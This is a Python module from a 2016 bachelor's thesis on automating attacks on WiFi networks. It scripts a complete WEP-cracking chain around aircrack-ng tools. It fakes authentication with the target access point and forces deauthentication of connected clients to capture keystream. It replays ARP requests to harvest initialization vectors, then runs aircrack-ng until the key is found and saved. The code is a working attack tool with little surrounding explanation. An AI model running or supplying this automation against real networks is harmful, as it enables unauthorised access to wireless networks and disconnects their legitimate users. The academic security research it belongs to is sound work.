#!/usr/bin/env python3
"""
WEP cracking

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016

#Implementation notes
- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
- Airodump-ng has difficulties saving PRGA XOR based on some station vendors
  `"that's not really specific to WRT54G. It happens with some clients, like apple."
    <http://trac.aircrack-ng.org/ticket/372#comment:5>`_
  http://trac.aircrack-ng.org/ticket/915
  http://trac.aircrack-ng.org/ticket/372
- Aireplay-ng writes to stdout.
- Aircrack-ng does not flush when stdout is redirected to file and -q is set.
- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
  to terminate.'
  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
  writing and reading is performed. There's only one writer and one reader per file.
- Subprocesses' feedback result is available as an update of process' state, flags and stats. State describes current
  position in a lifecycle of the process. Flags can be set or cleared based on events during life of the process.
  Flags can be later cleared or set by other parts of the script - after the flag was recognised and appropriate
  reaction was performed.

"""
import logging
import os
import re
import subprocess
import tempfile
import time
from enum import Enum, unique

from .common import WirelessCapturer, deauthenticate
from .model import WirelessAccessPoint, WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class FakeAuthentication(object):
    """
    The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
    Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
    address in various aireplay-ng attacks and there is currently no associated client.
    It should be noted that the fake authentication attack does NOT generate any ARP packets.
    Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

    `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_

    Process at first tries Open System Authentication. If OSA is not supported and Shared Key Authentication is
    required, 'ska_required' flag is set. Fake Shared Key Authentication requires a keystream file to be provided.
    """

    @unique
    class State(Enum):
        """
        FakeAuthentication process states.
        """
        ok = 0  # Authenticated and associated successfully, sending keep-alive packet.
        new = 1  # just started
        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
        terminated = 100

    def __init__(self, tmp_dir, interface: WirelessInterface, ap: WirelessAccessPoint):
        """
        :type interface: WirelessInterface
        :param interface: wireless interface for fake authentication
        """
        self.tmp_dir = tmp_dir
        self.interface = interface  # type: WirelessInterface
        self.ap = ap  # type: WirelessAccessPoint

        self.process = None
        self.state = None
        self.flags = {}
        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

    def __init_flags(self):
        """
        Init flags describing state of the running process.
        Should be called only during start of the process. Flags are set during update_state().
        """
        self.flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
        self.flags['needs_prga_xor'] = False
        """Flag 'needs_prga_xor' is set if PRGA XOR file is needed for shared key authentication."""

    def start(self, reassoc_delay=30, keep_alive_delay=5, tries=5):
        """
        Start FakeAuthentication.
        Uses previously saved PRGA XOR, if available.
        :param reassoc_delay: reassociation timing in seconds
        :param keep_alive_delay: time between keep-alive packets
        :param tries: Exit if fake authentication fails 'n' time(s)
        """
        self.state = FakeAuthentication.State.new
        self.__init_flags()

        cmd = ['aireplay-ng',
               '--fakeauth', str(reassoc_delay),
               '-q', str(keep_alive_delay),
               '-T', str(tries),
               '-a', self.ap.bssid,
               '-h', self.interface.mac_address]
        if self.ap.prga_xor_path:  # TODO(xvondr20) What if PRGA XOR is avaible, but network does allow only OSA now?
            cmd.append('-y')
            cmd.append(self.ap.prga_xor_path)
        cmd.append(self.interface)
        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stdout', dir=self.tmp_dir)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stderr', dir=self.tmp_dir)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        # start process
        self.process = subprocess.Popen(cmd,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        logger.debug('FakeAuthentication started; ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'Waiting for beacon frame' in line:
                self.state = FakeAuthentication.State.waiting_for_beacon_frame
            elif 'Association successful' in line:
                self.state = FakeAuthentication.State.ok
            elif 'Got a deauthentication packet!' in line:
                # set flag to notify that at least one deauthentication packet was received since last update
                self.flags['deauthenticated'] = True
                logger.debug('FakeAuthentication received a deauthentication packet!')
            elif 'Switching to shared key authentication' in line and not self.ap.prga_xor_path:
                self.flags['needs_prga_xor'] = True
                logger.debug('FakeAuthentication needs PRGA XOR.')

        # check stderr
        if self.process_stderr_r and not self.process_stderr_r.closed:
            for line in self.process_stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aireplay-ng --fakeauth': '{}'. {}".format(line, str(self)))

        # is process running?
        if self.process.poll() is not None:
            self.state = FakeAuthentication.State.terminated

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('FakeAuthentication killed')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('FakeAuthentication clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove state
        self.state = None
        self.flags.clear()


class ArpReplay(object):
    """
    The classic ARP request replay attack is the most effective way to generate new initialization vectors  (IVs),
    and works very reliably. The program listens for an ARP packet then retransmits it back to the access point.
    This, in turn,  causes  the  access point  to  repeat  the  ARP  packet  with  a new IV. The program retransmits
    the same ARP packet over and over. However, each ARP packet  repeated  by  the  access point has a new IVs.
    It is all these new IVs which allow you to determine the WEP key.

    `arp-request_reinjection[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection>`_
    """

    @unique
    class State(Enum):
        """
        ArpReplay process states.
        """
        ok = 0  # got ARP requests, sending packets,
        # Read (\d+) packets (got (\d*[1-9]\d*) ARP requests and (\d*[1-9]\d*) ACKs), sent (\d*[1-9]\d*) packets
        new = 1  # just started
        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
        waiting_for_arp_request = 3  # 'Read (\d+) packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)'
        terminated = 100

    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint):
        """
        :type ap: WirelessAccessPoint
        :param ap: AP targeted for attack

        :type interface: WirelessInterface
        :param interface: wireless interface for connection
        """
        self.interface = interface  # type: WirelessInterface
        self.ap = ap  # type: WirelessAccessPoint

        self.process = None
        self.state = None
        self.flags = {}
        self.stats = {}
        self.tmp_dir = None
        self.cap_path = None

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

        # compiled regular expressions
        self.cre_ok = re.compile(
            r'^Read (?P<read>\d+) packets \(got (?P<ARPs>\d*[1-9]\d*) ARP requests and (?P<ACKs>\d*[1-9]\d*) ACKs\),'
            r' sent (?P<sent>\d*[1-9]\d*) packets...\((?P<pps>\d+) pps\)$'
        )
        self.cre_cap_filename = re.compile(
            r'^Saving ARP requests in (?P<cap_filename>replay_arp.+\.cap)$'
        )

    def __str__(self):
        s = '<ArpReplay state: ' + str(self.state) +\
            ', flags: ' + str(self.flags) +\
            ', stats: ' + str(self.stats) +\
            '>'
        return s

    def __init_flags(self):
        """
        Init flags describing state of the running process.
        Should be called only during start of the process. Flags are set during update_state().
        """
        self.flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""

    def __init_stats(self):
        """
        Init stats describing state of the running process.
        Should be called only during start of the process.
        """
        self.stats = {
            'read': 0,
            'ACKs': 0,
            'ARPs': 0,
            'sent': 0,
            'pps': 0
        }

    def start(self, source_mac):
        """
        Start ARP Replay attack process.
        Uses previously saved ARP capture, if available.
        If ARP capture is not available, it is saved after detection of ARP Request.
        :param source_mac: Source MAC address for replayed ARP packets
        """
        self.state = ArpReplay.State.new
        self.__init_flags()
        self.__init_stats()
        self.tmp_dir = tempfile.TemporaryDirectory()

        cmd = ['aireplay-ng',
               '--arpreplay',
               '-b', self.ap.bssid,  # MAC address of access point.
               '-h', source_mac]
        # capture and extract packets from capture file?
        if self.ap.arp_cap_path:
            cmd.append('-r')
            cmd.append(self.ap.arp_cap_path)
        cmd.append(self.interface.name)

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='arpreplay-stdout', dir=self.tmp_dir.name)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='arpreplay-stderr', dir=self.tmp_dir.name)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        logger.debug('ArpReplay started; cwd=' + self.tmp_dir.name + ', ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags and stats.
        """
        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'Waiting for beacon frame' in line:
                self.state = ArpReplay.State.waiting_for_beacon_frame
            elif 'got 0 ARP requests' in line:
                self.state = ArpReplay.State.waiting_for_arp_request
            elif 'Notice: got a deauth/disassoc packet. Is the source MAC associated ?' in line:
                # set flag to notify that at least one deauthentication packet was received since last update
                self.flags['deauthenticated'] = True
                logger.debug('ArpReplay received a deauthentication packet!')
            else:
                m = self.cre_ok.match(line)
                if m:
                    # correct output line detected
                    self.state = ArpReplay.State.ok
                    # update stats
                    self.stats['read'] = m.group('read')
                    self.stats['ACKs'] = m.group('ACKs')
                    self.stats['ARPs'] = m.group('ARPs')
                    self.stats['sent'] = m.group('sent')
                    self.stats['pps'] = m.group('pps')
                    # save ARP Requests if the network does not have ARP capture file already
                    if not self.ap.arp_cap_path and self.cap_path:
                        self.ap.save_arp_cap(self.cap_path)

                m = self.cre_cap_filename.match(line)
                if m:
                    # capture filename announce detected
                    self.cap_path = os.path.join(self.tmp_dir.name, m.group('cap_filename'))

        # check stderr
        if self.process_stderr_r and not self.process_stderr_r.closed:
            for line in self.process_stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aireplay-ng --arpreplay': '{}'. {}".format(line, str(self)))

        # is process running?
        if self.process.poll() is not None:
            self.state = ArpReplay.State.terminated

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('ArpReplay killed')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('ArpReplay clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove tmp
        self.tmp_dir.cleanup()
        self.tmp_dir = None
        self.cap_path = None  # file was deleted with tmp_dir

        # remove state
        self.state = None
        self.flags.clear()
        self.stats.clear()


class WepCracker(object):
    """
    Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
    of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
    approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first
    phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture.
    Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW
    Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit
    WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.
    The second method is the FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks
    to discover the WEP key and uses these in combination with brute forcing.

    `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
    """

    @unique
    class State(Enum):
        """
        WepCracker process states.
        """
        ok = 0  # cracking or waiting for more IVs
        new = 1  # just started
        terminated = 100

    def __init__(self, cap_filepath, ap):
        self.cap_filepath = cap_filepath
        self.ap = ap

        self.process = None
        self.state = None
        self.tmp_dir = None

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

    def start(self):
        self.state = self.__class__.State.new
        self.tmp_dir = tempfile.TemporaryDirectory()

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='wepcrack-stdout', dir=self.tmp_dir.name)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='wepcrack-stderr', dir=self.tmp_dir.name)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        cmd = ['aircrack-ng',
               '-a', '1',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-l', 'psk.hex',  # Write the key into a file.
               self.cap_filepath]
        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
        self.state = self.__class__.State.ok
        logger.debug('WepCracker started; cwd=' + self.tmp_dir.name + ', ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
        in the moment of termination of aircrack-ng.
        """
        # is process running?
        if self.process.poll() is not None:
            self.state = self.__class__.State.terminated

        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'Failed. Next try with' in line:
                if self.state != self.__class__.State.terminated:
                    self.state = self.__class__.State.ok
            elif 'KEY FOUND!' in line:
                if self.state != self.__class__.State.terminated:
                    self.state = self.__class__.State.ok
                self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.hex'))
                logger.debug('WepCracker found key!')
            elif 'Decrypted correctly:' in line:
                if '100%' not in line:
                    # Incorrect decryption?
                    logger.warning(line)

        # check stderr
        if self.process_stderr_r and not self.process_stderr_r.closed:
            for line in self.process_stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('WepCracker killed')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('WepCracker clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove tmp
        self.tmp_dir.cleanup()
        self.tmp_dir = None

        # remove state
        self.state = None


class WepAttacker(object):
    """
    Main class providing attack on WEP secured network.
    """

    def __init__(self, ap: WirelessAccessPoint, monitoring_interface: WirelessInterface):
        """
        :type ap: WirelessAccessPoint
        :param ap: AP targeted for attack

        :type monitoring_interface: WirelessInterface
        :param monitoring_interface: network interface in monitor mode
        """
        self.ap = ap
        self.monitoring_interface = monitoring_interface

    def start(self, force=False):
        """
        Start attack on WEP secured network.
        If targeted network have already been cracked and `force` is False, attack is skipped.
        :param force: attack even if network have already been cracked
        """
        if not force and self.ap.is_cracked():
            #  AP already cracked
            logger.info('Known ' + str(self.ap))
            return
        with tempfile.TemporaryDirectory() as tmp_dirname:
            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
            capturer.start(self.ap)

            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.monitoring_interface,
                                                     ap=self.ap)
            fake_authentication.start()
            time.sleep(1)

            while fake_authentication.state != FakeAuthentication.State.ok:
                fake_authentication.update_state()
                if fake_authentication.flags['needs_prga_xor']:
                    # deauthenticate stations to acquire prga_xor
                    result = capturer.get_capture_result()
                    if len(result):  # if AP was detected by capturer
                        tmp_ap = result[0]
                        while not capturer.has_prga_xor():
                            for st in tmp_ap.associated_stations:
                                deauthenticate(self.monitoring_interface, st)
                                time.sleep(2)
                                if capturer.has_prga_xor():
                                    break
                        self.ap.save_prga_xor(capturer.capturing_xor_path)
                        logger.info('PRGA XOR detected.')
                        # stop fakeauth without prga_xor
                        fake_authentication.clean()
                        # start fakeauth with prga_xor
                        fake_authentication.start()
                    else:
                        logger.info('Network not detected by capturer yet.')
                if fake_authentication.flags['deauthenticated']:
                    # wait and restart fakeauth
                    fake_authentication.clean()
                    logger.debug('fakeauth: 5 s backoff')
                    time.sleep(5)
                    fake_authentication.start()

            arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
            arp_replay.start(source_mac=self.monitoring_interface.mac_address)

            # some time to create capture capturer.capturing_cap_path
            while capturer.get_iv_sum() < 100:
                time.sleep(1)

            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
            cracker.start()

            while not self.ap.is_cracked():
                fake_authentication.update_state()
                arp_replay.update_state()
                cracker.update_state()

                logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
                             'flags: ' + str(fake_authentication.flags)
                             )

                logger.debug(arp_replay)

                logger.debug('WepCracker: ' + str(cracker.state))

                logger.info('#IV = ' + str(capturer.get_iv_sum()))
                time.sleep(5)
            logger.info('Cracked ' + str(self.ap))

            cracker.stop()
            cracker.clean()
            capturer.stop()
            capturer.clean()
            arp_replay.stop()
            arp_replay.clean()
            fake_authentication.stop()
            fake_authentication.clean()
